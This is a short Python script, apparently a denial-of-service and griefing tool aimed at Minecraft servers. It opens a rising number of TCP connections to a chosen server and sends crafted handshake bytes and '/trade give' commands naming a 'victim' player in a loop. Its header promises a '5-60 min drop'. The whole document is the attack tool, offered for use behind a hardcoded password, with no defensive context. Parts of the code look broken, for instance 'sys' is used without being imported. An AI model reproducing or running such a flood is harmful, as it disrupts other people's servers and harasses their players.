#!/usr/bin/env python3
# adaptive-brute.py – live /trade flood – rootless – 5-60 min drop
import socket,time,random,string,colorama
colorama.init()
PWD="AE-ADMIN10"
def flood(server,port,victim):
    level=1
    while True:
        for _ in range(level):
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((server,int(port)))
                s.send(b'\x02\x00\x2c\x09localhost\x00\x63\xdd\x01\x01\x00')
                s.recv(4096)
                cmd=f"/trade give {victim} minecraft:diamond_block {random.randint(1,64)}"
                s.send(bytes([0x03,(len(cmd)>>8)&0xFF,len(cmd)&0xFF])+cmd.encode())
                s.close()
            except:pass
        level+=1
        time.sleep(0.01)

if __name__=="__main__":
    if input("Password: ").strip()!=PWD:sys.exit(1)
    server=input("Server IP:port: ").strip()
    victim=input("Victim username: ").strip()
    flood(server.split(":")[0],server.split(":")[1] if ":" in server else "25565",victim)
